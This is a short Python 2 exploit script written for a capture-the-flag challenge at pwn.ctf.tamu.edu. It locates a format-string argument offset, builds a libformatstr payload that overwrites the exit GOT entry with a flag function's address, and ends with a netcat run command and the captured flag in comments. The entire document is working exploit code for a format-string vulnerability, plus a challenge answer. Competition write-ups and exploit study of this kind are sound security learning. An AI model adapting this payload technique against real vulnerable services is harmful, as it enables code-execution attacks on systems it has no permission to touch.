#!/usr/bin/env python2
import sys
import socket
from libformatstr import *
r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
r.connect(('pwn.ctf.tamu.edu', 4323))

exitplt = 0x804a01c
flag = 0x80485ab

bufsiz = 100
buf = "" 
r.send(make_pattern(bufsiz) + "\n")
data = r.recv(1024)
offset, padding = guess_argnum(data[27:], bufsiz)
r.close()
p = FormatStr(bufsiz)
p[exitplt] = flag 
buf += p.payload(offset, padding)
print buf

#(python2 pwn.py; cat -) | nc pwn.ctf.tamu.edu 4323
#gigem{F0RM@1NG_1S_H4RD}
